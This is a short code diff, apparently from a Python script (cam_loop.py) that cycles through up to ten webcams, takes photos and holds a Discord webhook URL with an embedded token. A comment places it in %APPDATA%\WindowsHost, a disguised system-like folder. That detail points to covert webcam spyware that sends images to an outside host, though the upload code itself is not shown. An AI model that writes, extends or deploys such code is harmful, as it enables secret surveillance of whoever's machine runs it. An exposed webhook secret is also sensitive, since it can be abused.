@@ -5,12 +5,8 @@ import os
 
 # ─────────────── CONFIGURATION ─────────────── #
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1378995998826958878/N_ZyfXxxRHP8wdIHzpZIBi3FB8VjOwS4PS8ORW1x6JGdvxtw7mUN-E7MB5quEw1KoDMO"
-
-# Check up to camera indexes 0..? (10 means 0 through 9)
-MAX_CAMERAS = 10
-
-# Save images in the current working directory (WindowsHost folder)
-SAVE_DIR = os.getcwd()
+MAX_CAMERAS = 10           # will check cameras 0 through 9
+SAVE_DIR = os.getcwd()     # cam_loop.py runs from %APPDATA%\WindowsHost
 
 def take_photo(cam_index):
     cap = cv2.VideoCapture(cam_index)
